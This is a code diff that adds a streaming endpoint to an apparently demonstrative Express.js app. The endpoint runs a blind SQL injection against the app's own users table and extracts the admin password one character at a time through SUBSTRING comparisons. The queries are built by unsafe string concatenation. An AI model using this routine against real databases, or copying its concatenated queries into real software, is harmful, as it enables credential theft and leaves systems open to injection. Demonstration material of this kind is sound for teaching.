@@ -108,6 +108,48 @@ app.post('/api/logout', (req, res) => {
   res.json({ success: true, message: 'Logged out successfully' });
 });
 
+// Blind SQL Injection API endpoint (streaming)
+app.post('/api/blind-sql-injection', async (req, res) => {
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+  res.setHeader('Transfer-Encoding', 'chunked');
+
+  const TARGET_USER = 'admin';
+  const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=';
+  const MAX_LENGTH = 30;
+  let extractedPassword = '';
+  let finished = false;
+
+  for (let i = 1; i <= MAX_LENGTH && !finished; i++) {
+    let found = false;
+    for (const char of CHARS) {
+      // Blind SQL injection payload
+      const payload = `${TARGET_USER}' AND SUBSTRING(password FROM ${i} FOR 1) = '${char}' --`;
+      const query = `SELECT * FROM users WHERE username = '${payload}' AND password = 'anything'`;
+      try {
+        const result = await pool.query(query);
+        res.write(JSON.stringify({ type: 'progress', position: i, char }) + '\n');
+        if (result.rows.length > 0) {
+          extractedPassword += char;
+          found = true;
+          res.write(JSON.stringify({ type: 'found', position: i, char, partial: extractedPassword }) + '\n');
+          break;
+        }
+      } catch (err) {
+        // Ignore errors for this demo
+      }
+    }
+    if (!found) {
+      finished = true;
+    }
+  }
+  if (extractedPassword.length > 0) {
+    res.write(JSON.stringify({ type: 'done', password: extractedPassword }) + '\n');
+  } else {
+    res.write(JSON.stringify({ type: 'done', password: null }) + '\n');
+  }
+  res.end();
+});
+
 // Start the server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
